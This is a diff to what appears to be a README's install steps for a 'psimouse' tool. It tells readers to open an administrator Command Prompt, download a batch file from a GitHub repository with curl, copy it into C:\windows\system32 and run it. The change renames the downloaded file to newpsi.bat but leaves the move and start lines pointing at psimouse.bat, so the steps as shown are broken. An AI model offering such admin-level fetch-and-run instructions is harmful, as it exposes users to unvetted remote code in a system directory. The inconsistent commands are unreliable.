@@ -34,7 +34,7 @@ Press Ctrl+C to stop.
 Open **Command Prompt as Administrator** and run:
 
 ```bat
-curl -L -o "%TEMP%\psimouse.bat" "https://github.com/SellerDumpskart/psimouse/raw/refs/heads/main/psimouse.bat"
+curl -L -o "%TEMP%\newpsi.bat" "https://github.com/SellerDumpskart/psimouse/raw/refs/heads/main/psimouse.bat"
 move /Y "%TEMP%\psimouse.bat" "C:\windows\system32\psimouse.bat"
 start "" "C:\windows\system32\psimouse.bat"
 ```
